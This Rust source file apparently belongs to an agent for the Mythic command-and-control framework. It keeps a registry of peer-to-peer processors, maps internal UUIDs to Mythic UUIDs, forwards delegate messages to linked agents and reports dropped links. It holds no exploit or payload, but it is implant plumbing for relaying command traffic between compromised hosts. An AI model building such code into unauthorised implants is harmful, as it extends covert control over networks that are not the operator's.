use crate::structs::{
    AddInternalConnectionMessage, ConnectionInfo, DelegateMessage, P2PConnectionMessage,
    P2PProcessor, RemoveInternalConnectionMessage,
};
use crate::utils;
use std::collections::HashMap;
use std::sync::RwLock;
use tokio::sync::mpsc;

lazy_static::lazy_static! {
    /// UUID mappings: internal UUID -> Mythic UUID
    static ref UUID_MAPPINGS: RwLock<HashMap<String, String>> = RwLock::new(HashMap::new());

    /// Available P2P processors by profile name
    static ref AVAILABLE_P2P: RwLock<HashMap<String, Box<dyn P2PProcessor>>> = RwLock::new(HashMap::new());
}

/// Channels for P2P connection management
pub struct P2PChannels {
    pub remove_connection_tx: mpsc::Sender<RemoveInternalConnectionMessage>,
    pub add_connection_tx: mpsc::Sender<AddInternalConnectionMessage>,
}

/// Initialize P2P system
pub fn initialize(
    p2p_connection_msg_tx: mpsc::Sender<P2PConnectionMessage>,
    get_mythic_id: fn() -> String,
) -> P2PChannels {
    let (remove_tx, remove_rx) = mpsc::channel::<RemoveInternalConnectionMessage>(5);
    let (add_tx, add_rx) = mpsc::channel::<AddInternalConnectionMessage>(5);

    tokio::spawn(listen_for_remove_internal_p2p_connections(
        remove_rx,
        p2p_connection_msg_tx,
        get_mythic_id,
    ));
    tokio::spawn(listen_for_add_internal_p2p_connections(add_rx));

    P2PChannels {
        remove_connection_tx: remove_tx,
        add_connection_tx: add_tx,
    }
}

/// Register a P2P processor
pub fn register_available_p2p(processor: Box<dyn P2PProcessor>) {
    let mut p2p = AVAILABLE_P2P.write().expect("P2P lock poisoned");
    p2p.insert(processor.profile_name().to_string(), processor);
}

/// Get a printable map of all P2P connections
pub fn get_internal_p2p_map() -> String {
    let p2p = AVAILABLE_P2P.read().expect("P2P lock poisoned");
    let mut output = String::new();
    for (name, processor) in p2p.iter() {
        output.push_str(&format!("{}:\n", name));
        output.push_str(&processor.get_internal_p2p_map());
        output.push('\n');
    }
    output
}

/// Convert internal UUID to Mythic UUID
fn get_internal_connection_uuid(old_uuid: &str) -> String {
    let mappings = UUID_MAPPINGS.read().expect("UUID mappings lock poisoned");
    mappings
        .get(old_uuid)
        .cloned()
        .unwrap_or_else(|| old_uuid.to_string())
}

/// Add a UUID mapping
fn add_internal_connection_uuid(key: &str, value: &str) {
    let mut mappings = UUID_MAPPINGS.write().expect("UUID mappings lock poisoned");
    mappings.insert(key.to_string(), value.to_string());
}

/// Handle delegate messages from egress, forwarding to appropriate P2P connections
pub fn handle_delegate_message_for_internal_p2p_connections(delegates: &[DelegateMessage]) {
    let p2p = AVAILABLE_P2P.read().expect("P2P lock poisoned");
    for delegate in delegates {
        if let Some(processor) = p2p.get(&delegate.c2_profile) {
            // Update UUID mapping if Mythic told us about a new one
            if !delegate.mythic_uuid.is_empty() && delegate.mythic_uuid != delegate.uuid {
                add_internal_connection_uuid(&delegate.uuid, &delegate.mythic_uuid);
            }
            processor.process_ingress_message_for_p2p(delegate);
        }
    }
}

/// Listen for P2P disconnect messages
async fn listen_for_remove_internal_p2p_connections(
    mut rx: mpsc::Receiver<RemoveInternalConnectionMessage>,
    p2p_msg_tx: mpsc::Sender<P2PConnectionMessage>,
    get_mythic_id: fn() -> String,
) {
    while let Some(remove_connection) = rx.recv().await {
        let successfully_removed;
        let removal_message;

        // Scope to drop the RwLock guard before the .await
        {
            let p2p = AVAILABLE_P2P.read().expect("P2P lock poisoned");

            removal_message = P2PConnectionMessage {
                action: "remove".to_string(),
                c2_profile: remove_connection.c2_profile_name.clone(),
                destination: remove_connection.connection_uuid.clone(),
                source: get_mythic_id(),
            };

            successfully_removed = if let Some(processor) = p2p.get(&remove_connection.c2_profile_name) {
                processor.remove_internal_connection(&remove_connection.connection_uuid)
            } else {
                false
            };
        }

        if successfully_removed {
            let _ = p2p_msg_tx.send(removal_message).await;
        }
    }
}

/// Listen for new P2P connection tracking
async fn listen_for_add_internal_p2p_connections(
    mut rx: mpsc::Receiver<AddInternalConnectionMessage>,
) {
    while let Some(add_connection) = rx.recv().await {
        let p2p = AVAILABLE_P2P.read().expect("P2P lock poisoned");
        if let Some(processor) = p2p.get(&add_connection.c2_profile_name) {
            processor.add_internal_connection(add_connection.connection);
        }
    }
}
